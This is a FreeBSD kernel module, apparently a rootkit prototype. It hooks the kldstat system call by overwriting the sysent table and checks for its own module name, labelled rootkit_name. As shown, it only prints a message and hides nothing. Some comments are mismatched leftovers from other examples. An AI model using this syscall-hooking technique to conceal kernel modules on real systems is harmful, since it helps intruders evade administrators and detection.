#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/linker.h>


int compare_strings(char *, char*);

/* openat system call hook. */
static int
kldstat_hook(struct thread *td, void *syscall_args)
{
	struct kldstat_args /* {
		int fileid;
		struct kld_file_stat *stat;
	} */ *uap;
	uap = (struct kldstat_args *)syscall_args;

	
	/* Print a debug message. */
	char rootkit_name[100] = "kldstat_hook.ko";
	int error = sys_kldstat(td, syscall_args);
	//uprintf("kldstat is hooked\n");
	//uprintf("Holding Name:%s\n",uap->stat->name);
	//uprintf("Holding path:%s\n",uap->stat->pathname);
        if(compare_strings(rootkit_name,uap->stat->name) == 0){
		uprintf("Caught %s\n",uap->stat->name);
		uprintf("return message:%d\n",error);
		//_exit(0);	
	}
	return(error);
}
/* Compare two character strings*/
int compare_strings(char a[], char b[]){
	int c = 0;

	while (a[c] == b[c]) {
		if (a[c] == '\0' || b[c] == '\0')
			break;
		c++;
	}

	if (a[c] == '\0' && b[c] == '\0')
		return 0;
	else
		return -1;
}
/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg){

	int error = 0;

	switch (cmd) {
	
		case MOD_LOAD:
			/* Replace mkdir with mkdir_hook. */
			sysent[SYS_kldstat].sy_call = (sy_call_t *)kldstat_hook;
			break;
		case MOD_UNLOAD:
			/* Change everything back to normal. */
			sysent[SYS_kldstat].sy_call = (sy_call_t *)sys_kldstat;
			break;
		default:
			error = EOPNOTSUPP;
			break;
		}
		return(error);
}

static moduledata_t kldstat_hook_mod = {
	"kldstat_hook",	/* module name*/
	load,		/* event handler */
	NULL		/* extra data */
};

DECLARE_MODULE( kldstat_hook, kldstat_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
